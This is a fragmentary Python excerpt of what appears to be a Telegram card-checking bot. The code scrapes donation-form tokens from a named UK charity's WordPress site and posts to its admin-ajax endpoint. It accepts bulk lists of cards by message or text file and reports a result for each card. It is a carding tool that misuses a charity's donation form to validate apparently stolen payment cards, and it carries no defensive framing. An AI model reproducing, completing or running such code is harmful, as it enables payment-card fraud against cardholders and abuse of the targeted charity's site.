...
try:
    ...
    char_form = re.search(
        r'name="charitable_form_id"\s+value="([^"]+)"', response.text
    ).group(1)
    nonce = re.search(
        r'name="_charitable_donation_nonce"\s+value="([^"]+)"', response.text
    ).group(1)
...
response = s.post(
    "https://www.foursquare.org.uk/wp-admin/admin-ajax.php", headers=headers, data=data
)
...
def process_mass(message):
    ...
    bot.send_message(message.chat.id, f"⏳ بدأ فحص {len(cards)} بطاقات")
...
""",
            ...
            bot.send_message(message.chat.id, f"{cc}\nERROR: {e}")
...
def txt(message):
    ...
    bot.send_message(message.chat.id, "ارسل ملف txt")
